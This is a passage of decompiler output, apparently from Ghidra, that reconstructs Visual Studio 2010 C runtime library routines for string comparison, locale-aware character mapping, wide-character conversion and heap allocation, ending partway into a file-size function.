int __cdecl __mbsnbcmp_l(uchar *_Str1,uchar *_Str2,size_t _MaxCount,_locale_t _Locale)

{
  size_t sVar1;
  int iVar2;
  int *piVar3;
  ushort uVar4;
  uint uVar5;
  byte *pbVar6;
  byte *pbVar7;
  _LocaleUpdate local_14 [4];
  int local_10;
  int local_c;
  char local_8;
  
  if (_MaxCount == 0) {
    return 0;
  }
  _LocaleUpdate::_LocaleUpdate(local_14,_Locale);
  if (*(int *)(local_10 + 8) == 0) {
    iVar2 = _strncmp((char *)_Str1,(char *)_Str2,_MaxCount);
    if (local_8 != '\0') {
      *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
    }
  }
  else if (_Str1 == (uchar *)0x0) {
    piVar3 = __errno();
    *piVar3 = 0x16;
    FUN_004071df();
    if (local_8 != '\0') {
      *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
    }
    iVar2 = 0x7fffffff;
  }
  else {
    if (_Str2 != (uchar *)0x0) {
      do {
        uVar5 = (uint)*_Str1;
        sVar1 = _MaxCount - 1;
        pbVar6 = _Str1 + 1;
        if ((*(byte *)(uVar5 + 0x1d + local_10) & 4) == 0) {
LAB_0040fe97:
          uVar4 = (ushort)uVar5;
          uVar5 = (uint)*_Str2;
          pbVar7 = _Str2 + 1;
          if ((*(byte *)(uVar5 + 0x1d + local_10) & 4) != 0) {
            if (sVar1 != 0) {
              sVar1 = _MaxCount - 2;
              if (*pbVar7 != 0) {
                uVar5 = (uint)CONCAT11(*_Str2,*pbVar7);
                pbVar7 = _Str2 + 2;
                goto LAB_0040fec5;
              }
            }
            _MaxCount = sVar1;
            uVar5 = 0;
            sVar1 = _MaxCount;
          }
        }
        else {
          if (sVar1 != 0) {
            if (*pbVar6 == 0) {
              uVar5 = 0;
            }
            else {
              uVar5 = (uint)CONCAT11(*_Str1,*pbVar6);
              pbVar6 = _Str1 + 2;
            }
            goto LAB_0040fe97;
          }
          uVar5 = (uint)*_Str2;
          uVar4 = 0;
          pbVar7 = _Str2;
          if ((*(byte *)(uVar5 + 0x1d + local_10) & 4) != 0) {
LAB_0040fe6c:
            if (local_8 != '\0') {
              *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
            }
            return 0;
          }
        }
LAB_0040fec5:
        _MaxCount = sVar1;
        if ((ushort)uVar5 != uVar4) {
          iVar2 = (-(uint)((ushort)uVar5 < uVar4) & 2) - 1;
          if (local_8 == '\0') {
            return iVar2;
          }
          *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
          return iVar2;
        }
        if ((uVar4 == 0) || (_Str1 = pbVar6, _Str2 = pbVar7, _MaxCount == 0)) goto LAB_0040fe6c;
      } while( true );
    }
    piVar3 = __errno();
    *piVar3 = 0x16;
    FUN_004071df();
    if (local_8 != '\0') {
      *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
    }
    iVar2 = 0x7fffffff;
  }
  return iVar2;
}



// Library Function - Single Match
//  __mbsnbcmp
// 
// Library: Visual Studio 2010 Release

int __cdecl __mbsnbcmp(uchar *_Str1,uchar *_Str2,size_t _MaxCount)

{
  int iVar1;
  
  iVar1 = __mbsnbcmp_l(_Str1,_Str2,_MaxCount,(_locale_t)0x0);
  return iVar1;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  private: static void __cdecl type_info::_Type_info_dtor(class type_info *)
// 
// Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release, Visual Studio 2010 Release

void __cdecl type_info::_Type_info_dtor(type_info *param_1)

{
  int *_Memory;
  int *piVar1;
  int *piVar2;
  
  __lock(0xe);
  _Memory = DAT_00417cc4;
  if (*(int *)(param_1 + 4) != 0) {
    piVar1 = (int *)&DAT_00417cc0;
    do {
      piVar2 = piVar1;
      if (DAT_00417cc4 == (int *)0x0) goto LAB_0040ff4e;
      piVar1 = DAT_00417cc4;
    } while (*DAT_00417cc4 != *(int *)(param_1 + 4));
    piVar2[1] = DAT_00417cc4[1];
    _free(_Memory);
LAB_0040ff4e:
    _free(*(void **)(param_1 + 4));
    *(undefined4 *)(param_1 + 4) = 0;
  }
  FUN_0040ff71();
  return;
}



void FUN_0040ff71(void)

{
  FUN_0040da13(0xe);
  return;
}



// Library Function - Single Match
//  __msize
// 
// Library: Visual Studio 2010 Release

size_t __cdecl __msize(void *_Memory)

{
  int *piVar1;
  SIZE_T SVar2;
  
  if (_Memory == (void *)0x0) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    FUN_004071df();
    return 0xffffffff;
  }
  SVar2 = HeapSize(DAT_00417b04,0,_Memory);
  return SVar2;
}



// Library Function - Single Match
//  __freea
// 
// Library: Visual Studio 2010 Release

void __cdecl __freea(void *_Memory)

{
  if ((_Memory != (void *)0x0) && (*(int *)((int)_Memory + -8) == 0xdddd)) {
    _free((int *)((int)_Memory + -8));
  }
  return;
}



// WARNING: Function: __alloca_probe_16 replaced with injection: alloca_probe
// Library Function - Single Match
//  int __cdecl __crtLCMapStringA_stat(struct localeinfo_struct *,unsigned long,unsigned long,char
// const *,int,char *,int,int,int)
// 
// Library: Visual Studio 2010 Release

int __cdecl
__crtLCMapStringA_stat
          (localeinfo_struct *param_1,ulong param_2,ulong param_3,char *param_4,int param_5,
          char *param_6,int param_7,int param_8,int param_9)

{
  uint _Size;
  bool bVar1;
  uint uVar2;
  char *pcVar3;
  int iVar4;
  uint cchWideChar;
  uint uVar5;
  undefined4 *puVar6;
  int iVar7;
  undefined4 *local_10;
  
  uVar2 = DAT_00416048 ^ (uint)&stack0xfffffffc;
  pcVar3 = param_4;
  iVar7 = param_5;
  if (0 < param_5) {
    do {
      iVar7 = iVar7 + -1;
      if (*pcVar3 == '\0') goto LAB_0041008b;
      pcVar3 = pcVar3 + 1;
    } while (iVar7 != 0);
    iVar7 = -1;
LAB_0041008b:
    iVar7 = param_5 - iVar7;
    iVar4 = iVar7 + -1;
    bVar1 = iVar4 < param_5;
    param_5 = iVar4;
    if (bVar1) {
      param_5 = iVar7;
    }
  }
  if (param_8 == 0) {
    param_8 = param_1->locinfo->lc_codepage;
  }
  cchWideChar = MultiByteToWideChar(param_8,(uint)(param_9 != 0) * 8 + 1,param_4,param_5,(LPWSTR)0x0
                                    ,0);
  if (cchWideChar == 0) goto LAB_00410230;
  if (((int)cchWideChar < 1) || (0xffffffe0 / cchWideChar < 2)) {
    local_10 = (undefined4 *)0x0;
  }
  else {
    uVar5 = cchWideChar * 2 + 8;
    if (uVar5 < 0x401) {
      puVar6 = (undefined4 *)&stack0xffffffe0;
      local_10 = (undefined4 *)&stack0xffffffe0;
      if (&stack0x00000000 != (undefined *)0x20) {
LAB_0041011b:
        local_10 = puVar6 + 2;
      }
    }
    else {
      puVar6 = (undefined4 *)_malloc(uVar5);
      local_10 = puVar6;
      if (puVar6 != (undefined4 *)0x0) {
        *puVar6 = 0xdddd;
        goto LAB_0041011b;
      }
    }
  }
  if (local_10 == (undefined4 *)0x0) goto LAB_00410230;
  iVar7 = MultiByteToWideChar(param_8,1,param_4,param_5,(LPWSTR)local_10,cchWideChar);
  if ((iVar7 != 0) &&
     (uVar5 = LCMapStringW(param_2,param_3,(LPCWSTR)local_10,cchWideChar,(LPWSTR)0x0,0), uVar5 != 0)
     ) {
    if ((param_3 & 0x400) == 0) {
      if (((int)uVar5 < 1) || (0xffffffe0 / uVar5 < 2)) {
        puVar6 = (undefined4 *)0x0;
      }
      else {
        _Size = uVar5 * 2 + 8;
        if (_Size < 0x401) {
          if (&stack0x00000000 == (undefined *)0x20) goto LAB_00410224;
          puVar6 = (undefined4 *)&stack0xffffffe8;
        }
        else {
          puVar6 = (undefined4 *)_malloc(_Size);
          if (puVar6 != (undefined4 *)0x0) {
            *puVar6 = 0xdddd;
            puVar6 = puVar6 + 2;
          }
        }
      }
      if (puVar6 != (undefined4 *)0x0) {
        iVar7 = LCMapStringW(param_2,param_3,(LPCWSTR)local_10,cchWideChar,(LPWSTR)puVar6,uVar5);
        if (iVar7 != 0) {
          if (param_7 == 0) {
            param_7 = 0;
            param_6 = (LPSTR)0x0;
          }
          WideCharToMultiByte(param_8,0,(LPCWSTR)puVar6,uVar5,param_6,param_7,(LPCSTR)0x0,
                              (LPBOOL)0x0);
        }
        __freea(puVar6);
      }
    }
    else if ((param_7 != 0) && ((int)uVar5 <= param_7)) {
      LCMapStringW(param_2,param_3,(LPCWSTR)local_10,cchWideChar,(LPWSTR)param_6,param_7);
    }
  }
LAB_00410224:
  __freea(local_10);
LAB_00410230:
  iVar7 = ___security_check_cookie_4(uVar2 ^ (uint)&stack0xfffffffc);
  return iVar7;
}



// Library Function - Single Match
//  ___crtLCMapStringA
// 
// Library: Visual Studio 2010 Release

int __cdecl
___crtLCMapStringA(_locale_t _Plocinfo,LPCWSTR _LocaleName,DWORD _DwMapFlag,LPCSTR _LpSrcStr,
                  int _CchSrc,LPSTR _LpDestStr,int _CchDest,int _Code_page,BOOL _BError)

{
  int iVar1;
  localeinfo_struct local_14;
  int local_c;
  char local_8;
  
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&local_14,_Plocinfo);
  iVar1 = __crtLCMapStringA_stat
                    (&local_14,(ulong)_LocaleName,_DwMapFlag,_LpSrcStr,_CchSrc,_LpDestStr,_CchDest,
                     _Code_page,_BError);
  if (local_8 != '\0') {
    *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
  }
  return iVar1;
}



// WARNING: Function: __alloca_probe_16 replaced with injection: alloca_probe
// Library Function - Single Match
//  int __cdecl __crtGetStringTypeA_stat(struct localeinfo_struct *,unsigned long,char const
// *,int,unsigned short *,int,int,int)
// 
// Library: Visual Studio 2010 Release

int __cdecl
__crtGetStringTypeA_stat
          (localeinfo_struct *param_1,ulong param_2,char *param_3,int param_4,ushort *param_5,
          int param_6,int param_7,int param_8)

{
  uint _Size;
  uint uVar1;
  uint cchWideChar;
  undefined4 *puVar2;
  int iVar3;
  undefined4 *lpWideCharStr;
  
  uVar1 = DAT_00416048 ^ (uint)&stack0xfffffffc;
  if (param_6 == 0) {
    param_6 = param_1->locinfo->lc_codepage;
  }
  cchWideChar = MultiByteToWideChar(param_6,(uint)(param_7 != 0) * 8 + 1,param_3,param_4,(LPWSTR)0x0
                                    ,0);
  if (cchWideChar == 0) goto LAB_0041035d;
  lpWideCharStr = (undefined4 *)0x0;
  if ((0 < (int)cchWideChar) && (cchWideChar < 0x7ffffff1)) {
    _Size = cchWideChar * 2 + 8;
    if (_Size < 0x401) {
      puVar2 = (undefined4 *)&stack0xffffffe8;
      lpWideCharStr = (undefined4 *)&stack0xffffffe8;
      if (&stack0x00000000 != (undefined *)0x18) {
LAB_00410317:
        lpWideCharStr = puVar2 + 2;
      }
    }
    else {
      puVar2 = (undefined4 *)_malloc(_Size);
      lpWideCharStr = puVar2;
      if (puVar2 != (undefined4 *)0x0) {
        *puVar2 = 0xdddd;
        goto LAB_00410317;
      }
    }
  }
  if (lpWideCharStr != (undefined4 *)0x0) {
    _memset(lpWideCharStr,0,cchWideChar * 2);
    iVar3 = MultiByteToWideChar(param_6,1,param_3,param_4,(LPWSTR)lpWideCharStr,cchWideChar);
    if (iVar3 != 0) {
      GetStringTypeW(param_2,(LPCWSTR)lpWideCharStr,iVar3,param_5);
    }
    __freea(lpWideCharStr);
  }
LAB_0041035d:
  iVar3 = ___security_check_cookie_4(uVar1 ^ (uint)&stack0xfffffffc);
  return iVar3;
}



// Library Function - Single Match
//  ___crtGetStringTypeA
// 
// Library: Visual Studio 2010 Release

BOOL __cdecl
___crtGetStringTypeA
          (_locale_t _Plocinfo,DWORD _DWInfoType,LPCSTR _LpSrcStr,int _CchSrc,LPWORD _LpCharType,
          int _Code_page,BOOL _BError)

{
  int iVar1;
  int in_stack_00000020;
  pthreadlocinfo in_stack_ffffffec;
  int local_c;
  char local_8;
  
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&stack0xffffffec,_Plocinfo);
  iVar1 = __crtGetStringTypeA_stat
                    ((localeinfo_struct *)&stack0xffffffec,_DWInfoType,_LpSrcStr,_CchSrc,_LpCharType
                     ,_Code_page,in_stack_00000020,(int)in_stack_ffffffec);
  if (local_8 != '\0') {
    *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
  }
  return iVar1;
}



// Library Function - Single Match
//  ___free_lc_time
// 
// Library: Visual Studio 2010 Release

void __cdecl ___free_lc_time(void **param_1)

{
  if (param_1 != (void **)0x0) {
    _free(param_1[1]);
    _free(param_1[2]);
    _free(param_1[3]);
    _free(param_1[4]);
    _free(param_1[5]);
    _free(param_1[6]);
    _free(*param_1);
    _free(param_1[8]);
    _free(param_1[9]);
    _free(param_1[10]);
    _free(param_1[0xb]);
    _free(param_1[0xc]);
    _free(param_1[0xd]);
    _free(param_1[7]);
    _free(param_1[0xe]);
    _free(param_1[0xf]);
    _free(param_1[0x10]);
    _free(param_1[0x11]);
    _free(param_1[0x12]);
    _free(param_1[0x13]);
    _free(param_1[0x14]);
    _free(param_1[0x15]);
    _free(param_1[0x16]);
    _free(param_1[0x17]);
    _free(param_1[0x18]);
    _free(param_1[0x19]);
    _free(param_1[0x1a]);
    _free(param_1[0x1b]);
    _free(param_1[0x1c]);
    _free(param_1[0x1d]);
    _free(param_1[0x1e]);
    _free(param_1[0x1f]);
    _free(param_1[0x20]);
    _free(param_1[0x21]);
    _free(param_1[0x22]);
    _free(param_1[0x23]);
    _free(param_1[0x24]);
    _free(param_1[0x25]);
    _free(param_1[0x26]);
    _free(param_1[0x27]);
    _free(param_1[0x28]);
    _free(param_1[0x29]);
    _free(param_1[0x2a]);
    _free(param_1[0x2f]);
    _free(param_1[0x30]);
    _free(param_1[0x31]);
    _free(param_1[0x32]);
    _free(param_1[0x33]);
    _free(param_1[0x34]);
    _free(param_1[0x2e]);
    _free(param_1[0x36]);
    _free(param_1[0x37]);
    _free(param_1[0x38]);
    _free(param_1[0x39]);
    _free(param_1[0x3a]);
    _free(param_1[0x3b]);
    _free(param_1[0x35]);
    _free(param_1[0x3c]);
    _free(param_1[0x3d]);
    _free(param_1[0x3e]);
    _free(param_1[0x3f]);
    _free(param_1[0x40]);
    _free(param_1[0x41]);
    _free(param_1[0x42]);
    _free(param_1[0x43]);
    _free(param_1[0x44]);
    _free(param_1[0x45]);
    _free(param_1[0x46]);
    _free(param_1[0x47]);
    _free(param_1[0x48]);
    _free(param_1[0x49]);
    _free(param_1[0x4a]);
    _free(param_1[0x4b]);
    _free(param_1[0x4c]);
    _free(param_1[0x4d]);
    _free(param_1[0x4e]);
    _free(param_1[0x4f]);
    _free(param_1[0x50]);
    _free(param_1[0x51]);
    _free(param_1[0x52]);
    _free(param_1[0x53]);
    _free(param_1[0x54]);
    _free(param_1[0x55]);
    _free(param_1[0x56]);
    _free(param_1[0x57]);
    _free(param_1[0x58]);
  }
  return;
}



// Library Function - Single Match
//  ___free_lconv_num
// 
// Library: Visual Studio 2010 Release

void __cdecl ___free_lconv_num(void **param_1)

{
  if (param_1 != (void **)0x0) {
    if ((undefined *)*param_1 != PTR_DAT_00416e98) {
      _free(*param_1);
    }
    if ((undefined *)param_1[1] != PTR_DAT_00416e9c) {
      _free(param_1[1]);
    }
    if ((undefined *)param_1[2] != PTR_DAT_00416ea0) {
      _free(param_1[2]);
    }
    if ((undefined *)param_1[0xc] != PTR_DAT_00416ec8) {
      _free(param_1[0xc]);
    }
    if ((undefined *)param_1[0xd] != PTR_DAT_00416ecc) {
      _free(param_1[0xd]);
    }
  }
  return;
}



// Library Function - Single Match
//  ___free_lconv_mon
// 
// Library: Visual Studio 2010 Release

void __cdecl ___free_lconv_mon(int param_1)

{
  if (param_1 != 0) {
    if (*(undefined **)(param_1 + 0xc) != PTR_DAT_00416ea4) {
      _free(*(undefined **)(param_1 + 0xc));
    }
    if (*(undefined **)(param_1 + 0x10) != PTR_DAT_00416ea8) {
      _free(*(undefined **)(param_1 + 0x10));
    }
    if (*(undefined **)(param_1 + 0x14) != PTR_DAT_00416eac) {
      _free(*(undefined **)(param_1 + 0x14));
    }
    if (*(undefined **)(param_1 + 0x18) != PTR_DAT_00416eb0) {
      _free(*(undefined **)(param_1 + 0x18));
    }
    if (*(undefined **)(param_1 + 0x1c) != PTR_DAT_00416eb4) {
      _free(*(undefined **)(param_1 + 0x1c));
    }
    if (*(undefined **)(param_1 + 0x20) != PTR_DAT_00416eb8) {
      _free(*(undefined **)(param_1 + 0x20));
    }
    if (*(undefined **)(param_1 + 0x24) != PTR_DAT_00416ebc) {
      _free(*(undefined **)(param_1 + 0x24));
    }
    if (*(undefined **)(param_1 + 0x38) != PTR_DAT_00416ed0) {
      _free(*(undefined **)(param_1 + 0x38));
    }
    if (*(undefined **)(param_1 + 0x3c) != PTR_DAT_00416ed4) {
      _free(*(undefined **)(param_1 + 0x3c));
    }
    if (*(undefined **)(param_1 + 0x40) != PTR_DAT_00416ed8) {
      _free(*(undefined **)(param_1 + 0x40));
    }
    if (*(undefined **)(param_1 + 0x44) != PTR_DAT_00416edc) {
      _free(*(undefined **)(param_1 + 0x44));
    }
    if (*(undefined **)(param_1 + 0x48) != PTR_DAT_00416ee0) {
      _free(*(undefined **)(param_1 + 0x48));
    }
    if (*(undefined **)(param_1 + 0x4c) != PTR_DAT_00416ee4) {
      _free(*(undefined **)(param_1 + 0x4c));
    }
  }
  return;
}



// Library Function - Single Match
//  _strcspn
// 
// Library: Visual Studio

size_t __cdecl _strcspn(char *_Str,char *_Control)

{
  byte bVar1;
  byte *pbVar2;
  size_t sVar3;
  undefined4 uStack_28;
  undefined4 uStack_24;
  undefined4 uStack_20;
  undefined4 uStack_1c;
  undefined4 uStack_18;
  undefined4 uStack_14;
  undefined4 uStack_10;
  undefined4 uStack_c;
  
  uStack_c = 0;
  uStack_10 = 0;
  uStack_14 = 0;
  uStack_18 = 0;
  uStack_1c = 0;
  uStack_20 = 0;
  uStack_24 = 0;
  uStack_28 = 0;
  while( true ) {
    bVar1 = *_Control;
    if (bVar1 == 0) break;
    _Control = (char *)((byte *)_Control + 1);
    pbVar2 = (byte *)((int)&uStack_28 + ((int)(uint)bVar1 >> 3));
    *pbVar2 = *pbVar2 | '\x01' << (bVar1 & 7);
  }
  sVar3 = 0xffffffff;
  do {
    sVar3 = sVar3 + 1;
    bVar1 = *_Str;
    if (bVar1 == 0) {
      return sVar3;
    }
    _Str = (char *)((byte *)_Str + 1);
  } while ((*(byte *)((int)&uStack_28 + ((int)(uint)bVar1 >> 3)) >> (bVar1 & 7) & 1) == 0);
  return sVar3;
}



// Library Function - Single Match
//  _strncmp
// 
// Library: Visual Studio 2010 Release

int __cdecl _strncmp(char *_Str1,char *_Str2,size_t _MaxCount)

{
  byte *pbVar1;
  uint uVar2;
  byte *pbVar3;
  uint uVar4;
  uint local_8;
  
  local_8 = 0;
  if (_MaxCount != 0) {
    if ((3 < _MaxCount) && (pbVar1 = (byte *)_Str1, pbVar3 = (byte *)_Str2, _MaxCount != 4)) {
      do {
        _Str1 = (char *)(pbVar1 + 4);
        _Str2 = (char *)(pbVar3 + 4);
        if ((*pbVar1 == 0) || (*pbVar1 != *pbVar3)) {
          uVar2 = (uint)*pbVar1;
          uVar4 = (uint)*pbVar3;
          goto LAB_00410992;
        }
        if ((pbVar1[1] == 0) || (pbVar1[1] != pbVar3[1])) {
          uVar2 = (uint)pbVar1[1];
          uVar4 = (uint)pbVar3[1];
          goto LAB_00410992;
        }
        if ((pbVar1[2] == 0) || (pbVar1[2] != pbVar3[2])) {
          uVar2 = (uint)pbVar1[2];
          uVar4 = (uint)pbVar3[2];
          goto LAB_00410992;
        }
        if ((pbVar1[3] == 0) || (pbVar1[3] != pbVar3[3])) {
          uVar2 = (uint)pbVar1[3];
          uVar4 = (uint)pbVar3[3];
          goto LAB_00410992;
        }
        local_8 = local_8 + 4;
        pbVar1 = (byte *)_Str1;
        pbVar3 = (byte *)_Str2;
      } while (local_8 < _MaxCount - 4);
    }
    for (; local_8 < _MaxCount; local_8 = local_8 + 1) {
      if ((*_Str1 == 0) || (*_Str1 != *_Str2)) {
        uVar2 = (uint)(byte)*_Str1;
        uVar4 = (uint)(byte)*_Str2;
LAB_00410992:
        return uVar2 - uVar4;
      }
      _Str1 = (char *)((byte *)_Str1 + 1);
      _Str2 = (char *)((byte *)_Str2 + 1);
    }
  }
  return 0;
}



// Library Function - Single Match
//  _strpbrk
// 
// Library: Visual Studio

char * __cdecl _strpbrk(char *_Str,char *_Control)

{
  byte bVar1;
  byte *pbVar2;
  undefined4 uStack_28;
  undefined4 uStack_24;
  undefined4 uStack_20;
  undefined4 uStack_1c;
  undefined4 uStack_18;
  undefined4 uStack_14;
  undefined4 uStack_10;
  undefined4 uStack_c;
  
  uStack_c = 0;
  uStack_10 = 0;
  uStack_14 = 0;
  uStack_18 = 0;
  uStack_1c = 0;
  uStack_20 = 0;
  uStack_24 = 0;
  uStack_28 = 0;
  while( true ) {
    bVar1 = *_Control;
    if (bVar1 == 0) break;
    _Control = (char *)((byte *)_Control + 1);
    pbVar2 = (byte *)((int)&uStack_28 + ((int)(uint)bVar1 >> 3));
    *pbVar2 = *pbVar2 | '\x01' << (bVar1 & 7);
  }
  do {
    pbVar2 = (byte *)_Str;
    bVar1 = *pbVar2;
    if (bVar1 == 0) {
      return (char *)(uint)bVar1;
    }
    _Str = (char *)(pbVar2 + 1);
  } while ((*(byte *)((int)&uStack_28 + ((int)(char *)(uint)bVar1 >> 3)) >> (bVar1 & 7) & 1) == 0);
  return (char *)pbVar2;
}



// Library Function - Single Match
//  __wctomb_s_l
// 
// Library: Visual Studio 2010 Release

errno_t __cdecl
__wctomb_s_l(int *_SizeConverted,char *_MbCh,size_t _SizeInBytes,wchar_t _WCh,_locale_t _Locale)

{
  char *lpMultiByteStr;
  size_t _Size;
  int iVar1;
  int *piVar2;
  DWORD DVar3;
  int local_14 [2];
  int local_c;
  char local_8;
  
  _Size = _SizeInBytes;
  lpMultiByteStr = _MbCh;
  if ((_MbCh == (char *)0x0) && (_SizeInBytes != 0)) {
    if (_SizeConverted != (int *)0x0) {
      *_SizeConverted = 0;
    }
LAB_00410a04:
    iVar1 = 0;
  }
  else {
    if (_SizeConverted != (int *)0x0) {
      *_SizeConverted = -1;
    }
    if (0x7fffffff < _SizeInBytes) {
      piVar2 = __errno();
      *piVar2 = 0x16;
      FUN_004071df();
      return 0x16;
    }
    _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)local_14,_Locale);
    if (*(int *)(local_14[0] + 0x14) == 0) {
      if ((ushort)_WCh < 0x100) {
        if (lpMultiByteStr != (char *)0x0) {
          if (_Size == 0) goto LAB_00410a90;
          *lpMultiByteStr = (char)_WCh;
        }
        if (_SizeConverted != (int *)0x0) {
          *_SizeConverted = 1;
        }
LAB_00410abf:
        if (local_8 != '\0') {
          *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
        }
        goto LAB_00410a04;
      }
      if ((lpMultiByteStr != (char *)0x0) && (_Size != 0)) {
        _memset(lpMultiByteStr,0,_Size);
      }
    }
    else {
      _MbCh = (char *)0x0;
      iVar1 = WideCharToMultiByte(*(UINT *)(local_14[0] + 4),0,&_WCh,1,lpMultiByteStr,_Size,
                                  (LPCSTR)0x0,(LPBOOL)&_MbCh);
      if (iVar1 == 0) {
        DVar3 = GetLastError();
        if (DVar3 == 0x7a) {
          if ((lpMultiByteStr != (char *)0x0) && (_Size != 0)) {
            _memset(lpMultiByteStr,0,_Size);
          }
LAB_00410a90:
          piVar2 = __errno();
          *piVar2 = 0x22;
          FUN_004071df();
          if (local_8 == '\0') {
            return 0x22;
          }
          *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
          return 0x22;
        }
      }
      else if (_MbCh == (char *)0x0) {
        if (_SizeConverted != (int *)0x0) {
          *_SizeConverted = iVar1;
        }
        goto LAB_00410abf;
      }
    }
    piVar2 = __errno();
    *piVar2 = 0x2a;
    piVar2 = __errno();
    iVar1 = *piVar2;
    if (local_8 != '\0') {
      *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
    }
  }
  return iVar1;
}



// Library Function - Single Match
//  _wctomb_s
// 
// Library: Visual Studio 2010 Release

errno_t __cdecl _wctomb_s(int *_SizeConverted,char *_MbCh,rsize_t _SizeInBytes,wchar_t _WCh)

{
  errno_t eVar1;
  
  eVar1 = __wctomb_s_l(_SizeConverted,_MbCh,_SizeInBytes,_WCh,(_locale_t)0x0);
  return eVar1;
}



// Library Function - Single Match
//  __flswbuf
// 
// Library: Visual Studio 2010 Release

int __cdecl __flswbuf(int _Ch,FILE *_File)

{
  uint uVar1;
  char *_Buf;
  char *pcVar2;
  uint _FileHandle;
  int *piVar3;
  undefined **ppuVar4;
  int iVar5;
  undefined *puVar6;
  int unaff_EDI;
  uint _MaxCharCount;
  longlong lVar7;
  undefined4 local_8;
  
  _FileHandle = __fileno(_File);
  uVar1 = _File->_flag;
  if ((uVar1 & 0x82) == 0) {
    piVar3 = __errno();
    *piVar3 = 9;
LAB_00410b78:
    _File->_flag = _File->_flag | 0x20;
    return 0xffff;
  }
  if ((uVar1 & 0x40) != 0) {
    piVar3 = __errno();
    *piVar3 = 0x22;
    goto LAB_00410b78;
  }
  if ((uVar1 & 1) != 0) {
    _File->_cnt = 0;
    if ((uVar1 & 0x10) == 0) {
      _File->_flag = uVar1 | 0x20;
      return 0xffff;
    }
    _File->_ptr = _File->_base;
    _File->_flag = uVar1 & 0xfffffffe;
  }
  uVar1 = _File->_flag;
  _File->_cnt = 0;
  local_8 = 0;
  _MaxCharCount = 2;
  _File->_flag = uVar1 & 0xffffffef | 2;
  if (((uVar1 & 0x10c) == 0) &&
     (((ppuVar4 = FUN_0040803a(), _File != (FILE *)(ppuVar4 + 8) &&
       (ppuVar4 = FUN_0040803a(), _File != (FILE *)(ppuVar4 + 0x10))) ||
      (iVar5 = __isatty(_FileHandle), iVar5 == 0)))) {
    __getbuf(_File);
  }
  if ((_File->_flag & 0x108U) == 0) {
    local_8 = CONCAT22(local_8._2_2_,(short)_Ch);
    local_8 = __write(_FileHandle,&local_8,2);
  }
  else {
    _Buf = _File->_base;
    pcVar2 = _File->_ptr;
    _File->_ptr = _Buf + 2;
    _MaxCharCount = (int)pcVar2 - (int)_Buf;
    _File->_cnt = _File->_bufsiz + -2;
    if ((int)_MaxCharCount < 1) {
      if ((_FileHandle == 0xffffffff) || (_FileHandle == 0xfffffffe)) {
        puVar6 = &DAT_00416540;
      }
      else {
        puVar6 = (undefined *)((_FileHandle & 0x1f) * 0x40 + (&DAT_00418ea0)[(int)_FileHandle >> 5])
        ;
      }
      if (((puVar6[4] & 0x20) != 0) &&
         (lVar7 = __lseeki64(_FileHandle,0x200000000,unaff_EDI), lVar7 == -1)) goto LAB_00410caf;
    }
    else {
      local_8 = __write(_FileHandle,_Buf,_MaxCharCount);
    }
    *(short *)_File->_base = (short)_Ch;
  }
  if (local_8 == _MaxCharCount) {
    return _Ch & 0xffff;
  }
LAB_00410caf:
  _File->_flag = _File->_flag | 0x20;
  return 0xffff;
}



// Library Function - Single Match
//  __calloc_impl
// 
// Library: Visual Studio 2010 Release

LPVOID __cdecl __calloc_impl(uint param_1,uint param_2,undefined4 *param_3)

{
  int *piVar1;
  LPVOID pvVar2;
  int iVar3;
  uint dwBytes;
  
  if ((param_1 != 0) && (0xffffffe0 / param_1 < param_2)) {
    piVar1 = __errno();
    *piVar1 = 0xc;
    return (LPVOID)0x0;
  }
  dwBytes = param_1 * param_2;
  if (dwBytes == 0) {
    dwBytes = 1;
  }
  do {
    pvVar2 = (LPVOID)0x0;
    if ((dwBytes < 0xffffffe1) &&
       (pvVar2 = HeapAlloc(DAT_00417b04,8,dwBytes), pvVar2 != (LPVOID)0x0)) {
      return pvVar2;
    }
    if (DAT_00417b0c == 0) {
      if (param_3 == (undefined4 *)0x0) {
        return pvVar2;
      }
      *param_3 = 0xc;
      return pvVar2;
    }
    iVar3 = __callnewh(dwBytes);
  } while (iVar3 != 0);
  if (param_3 != (undefined4 *)0x0) {
    *param_3 = 0xc;
  }
  return (LPVOID)0x0;
}



// Library Function - Single Match
//  _realloc
// 
// Library: Visual Studio 2010 Release

void * __cdecl _realloc(void *_Memory,size_t _NewSize)

{
  void *pvVar1;
  LPVOID pvVar2;
  int iVar3;
  int *piVar4;
  DWORD DVar5;
  
  if (_Memory == (void *)0x0) {
    pvVar1 = _malloc(_NewSize);
    return pvVar1;
  }
  if (_NewSize == 0) {
    _free(_Memory);
  }
  else {
    do {
      if (0xffffffe0 < _NewSize) {
        __callnewh(_NewSize);
        piVar4 = __errno();
        *piVar4 = 0xc;
        return (void *)0x0;
      }
      if (_NewSize == 0) {
        _NewSize = 1;
      }
      pvVar2 = HeapReAlloc(DAT_00417b04,0,_Memory,_NewSize);
      if (pvVar2 != (LPVOID)0x0) {
        return pvVar2;
      }
      if (DAT_00417b0c == 0) {
        piVar4 = __errno();
        DVar5 = GetLastError();
        iVar3 = __get_errno_from_oserr(DVar5);
        *piVar4 = iVar3;
        return (void *)0x0;
      }
      iVar3 = __callnewh(_NewSize);
    } while (iVar3 != 0);
    piVar4 = __errno();
    DVar5 = GetLastError();
    iVar3 = __get_errno_from_oserr(DVar5);
    *piVar4 = iVar3;
  }
  return (void *)0x0;
}



// Library Function - Single Match
//  __chsize_nolock
// 
// Library: Visual Studio 2010 Release

int __cdecl __chsize_nolock(int _FileHandle,longlong _Size)

{
